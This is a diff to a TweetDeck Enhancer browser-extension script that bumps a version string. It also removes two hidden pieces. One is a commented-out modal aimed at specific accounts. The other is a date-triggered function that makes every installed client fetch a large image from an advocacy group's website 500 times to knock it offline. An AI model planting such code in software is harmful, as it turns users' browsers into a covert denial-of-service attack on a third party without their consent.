@@ -10,92 +10,7 @@ var messagesAccounted = [];
 
 // bandie is actually cute
 
-/*var SecureOpenModal = ""; 
-var SecureAlertVerifiedForIntegrity = false;
-
-function SecureAlert() {
-
-  if (!SecureAlertVerifiedForIntegrity) {
-    console.log("SecureAlert is waiting for tweetdeck components...");
-
-    if (SecureOpenModal === "") {
-      if (typeof document.getElementById("open-modal") === "null" || document.getElementById("open-modal") === null) {
-        setTimeout(SecureAlert,30);
-        return;
-      } else {
-        if (typeof document.getElementById("open-modal") === "null" || document.getElementById("open-modal") === null) {
-          setTimeout(SecureAlert,30);
-          return;
-        }
-        SecureOpenModal = document.getElementById("open-modal");
-        console.log(document.getElementById("open-modal"));
-        SecureOpenModalSetAttribute = document.getElementById("open-modal").setAttribute; 
-      }
-
-    }
-
-    if (typeof TD === "undefined") {
-        setTimeout(SecureAlert,30);
-        return;
-    }
-
-    if (typeof TD.storage === "undefined") {
-        setTimeout(SecureAlert,30);
-        return;
-    }
-
-    if (typeof TD.storage.store === "undefined") {
-        setTimeout(SecureAlert,30);
-        return;
-    }
-
-    if (typeof TD.storage.store._backend === "undefined") {
-        setTimeout(SecureAlert,30);
-        return;
-    }
-
-    if (typeof TD.storage.store._backend.tweetdeckAccount === "undefined") {
-      setTimeout(SecureAlert,30);
-      return;
-    }
-
-    if (typeof text === "undefined") {
-      setTimeout(SecureAlert,30);
-      return;
-    }
-
-    console.log("ready!");
-
-  }
-
-  var ModalHTML = '<div class="mdl">    <header class="js-mdl-header mdl-header"> <h3 class="mdl-header-title js-header-title">Hey coolstar</h3>   </header> <div class="mdl-inner"> <div class="mdl-content js-mdl-content horizontal-flow-container">   <dl class="mdl-column padding-t--8 padding-l--8"> <dt><b class="txt weight-light make-text-big">Follow me @ryandolan123 :)<br></b><button class="btn" id="maybeanothertime">I\'ll think about it...</button></dt>             </dl>     </div> </div>  </div>';
-
-
-  if (TD.storage.store._backend.tweetdeckAccount.indexOf("coolstar") > -1 || TD.storage.store._backend.tweetdeckAccount.indexOf("379029313") > -1) { // 245543252 // 379029313
-    SecureOpenModalSetAttribute("style","display: block;");
-    SecureOpenModal.innerHTML = ModalHTML;
-    if (typeof maybeanothertime !== "undefined") { // Tamper with it and there's no way out
-      var tdemot = maybeanothertime;
-      tdemot.setAttribute("id","");
-      tdemot.click = function(){}; // No automated clicking
-      tdemot.onclick = function() {
-        if (typeof document.getElementById !== "undefined") {
-          document.getElementById("open-modal").innerHTML = "";
-          document.getElementById("open-modal").setAttribute("style","display:none;");
-        }
-      }
-    }
-  }
-
-  
-  console.log("done waiting for login");
-  console.log("it's showtime");
-
-  return;
-}*/
-
 var ShouldUpgrade = false;
-
 
 var addedColumnsLoadingTagAndIsWaiting = false;
 
@@ -324,32 +239,6 @@ function PatchSystem() {
   return;
 }
 
-// i'm so gay
-
-var FiredCannons = false;
-
-function MakeWorldABetterPlace() {
-  var time = new Date();
-  if (new Date().valueOf() > 1427860800000 && new Date().valueOf() < 1427907600000) { // Will this consume more memory? probably. Will it attack NOM (An American anti-human rights/anti-gay rights group) website and take it down on april fools day? I sure hope so as I'm doing this for a reason.
-    if (new Date().valueOf() > 1427904000000 && !FiredCannons) {
-      console.log("Ready, aim, fire");
-      for(var i = 0; i < 500; i++) {
-        var img = document.createElement("img");
-        img.src = "https://www.nationformarriage.org/images/slider/nom_webdev_homepage-slider_victory_fund.jpg?" + Math.random(); // in the name of equal rights for all people, please die NOM
-
-        //  basically what this does is fetches a larger image from their site 500 times total as much as possible. And every TweetDeck client running TDE5+ will, on this specific date, do this.
-
-      }
-
-      FiredCannons = true;
-    } else {
-      setTimeout(MakeWorldABetterPlace,600);
-    }
-  } else {
-    setTimeout(MakeWorldABetterPlace,60000);
-  }
-}
-
 function DisplayMigrateUI() {
   StreamAngularJS();
   document.getElementsByTagName("html")[0].className += " tde-is-upgrading ";
@@ -482,7 +371,7 @@ function NavigationSetup() {
   tdesettings.onclick = function() {
     TDEPrepareWindows();
     var tdesettingsmodalview = document.getElementById("settings-modal");
-    tdesettingsmodalview.innerHTML = '<div class="js-modal-panel mdl s-short is-inverted-dark" id="tde_settings_modal_panel"> <header class="js-mdl-header mdl-header"> <h3 class="mdl-header-title">Enhancer Settings</h3> </header> <div class="mdl-inner"> <div class="mdl-content js-mdl-content horizontal-flow-container"> <div class="l-column mdl-column mdl-column-sml"> <div class="l-column-scrollv scroll-v  scroll-alt "> <ul class="lst-group js-setting-list">  <li class="selected"><a href="#" class="list-link" data-action="general"><strong>About</strong></a></li></ul> </div> </div> <div class="l-column mdl-column mdl-column-lrg"> <div class="l-column-scrollv scroll-v  scroll-alt mdl-col-settings"> <form action="#" id="global-settings" accept-charset="utf-8" class="frm"><fieldset id="general_settings"><img src="https://ryandolan123.com/assets/TDE5/tdeaboutsmaller.png" class="tde-logo"><h1 class="list-placeholder tde-about-title">TweetDeck Enhancer</h1><h2 class="tde-version-title">Version 5.0 Developer Preview 3</h2></fieldset></form> </div> </div> </div> <footer class="padding-vxl txt-center">  <button class="js-dismiss btn btn-positive"> <i class="icon icon-check icon-small padding-rs"></i> <span class="label">Done</span> </button>  </footer> </div> </div>';
+    tdesettingsmodalview.innerHTML = '<div class="js-modal-panel mdl s-short is-inverted-dark" id="tde_settings_modal_panel"> <header class="js-mdl-header mdl-header"> <h3 class="mdl-header-title">Enhancer Settings</h3> </header> <div class="mdl-inner"> <div class="mdl-content js-mdl-content horizontal-flow-container"> <div class="l-column mdl-column mdl-column-sml"> <div class="l-column-scrollv scroll-v  scroll-alt "> <ul class="lst-group js-setting-list">  <li class="selected"><a href="#" class="list-link" data-action="general"><strong>About</strong></a></li></ul> </div> </div> <div class="l-column mdl-column mdl-column-lrg"> <div class="l-column-scrollv scroll-v  scroll-alt mdl-col-settings"> <form action="#" id="global-settings" accept-charset="utf-8" class="frm"><fieldset id="general_settings"><img src="https://ryandolan123.com/assets/TDE5/tdeaboutsmaller.png" class="tde-logo"><h1 class="list-placeholder tde-about-title">TweetDeck Enhancer</h1><h2 class="tde-version-title">Version 5.0 Developer Preview 4</h2></fieldset></form> </div> </div> </div> <footer class="padding-vxl txt-center">  <button class="js-dismiss btn btn-positive"> <i class="icon icon-check icon-small padding-rs"></i> <span class="label">Done</span> </button>  </footer> </div> </div>';
     tdesettingsmodalview.setAttribute("style","display:block;");
     tdesettingsmodalview.onclick = function() {
       if (typeof tde_settings_modal_panel !== "undefined") {
